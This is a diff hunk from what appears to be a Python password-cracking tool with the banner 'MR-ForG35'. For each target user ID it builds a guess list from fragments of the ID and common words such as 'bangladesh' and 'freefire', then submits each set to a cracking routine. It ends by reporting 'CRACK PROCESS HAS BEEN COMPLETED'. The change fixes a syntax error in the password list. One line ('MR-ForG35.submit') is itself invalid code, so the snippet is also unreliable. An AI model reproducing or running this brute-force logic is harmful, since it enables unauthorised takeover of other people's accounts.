@@ -323,7 +323,7 @@ def C2():
         print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{ha}/{bu}/{ta} ~ {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print(f"\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMR-ForG35\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●  ")
         for love in user:
-            pwx = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','ilove you','freefire',']
+            pwx = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','ilove you','freefire']
             uid = code+love
             MR-ForG35.submit(rcrack1,uid,pwx,tl)
     print(' CRACK PROCESS HAS BEEN COMPLETED ')
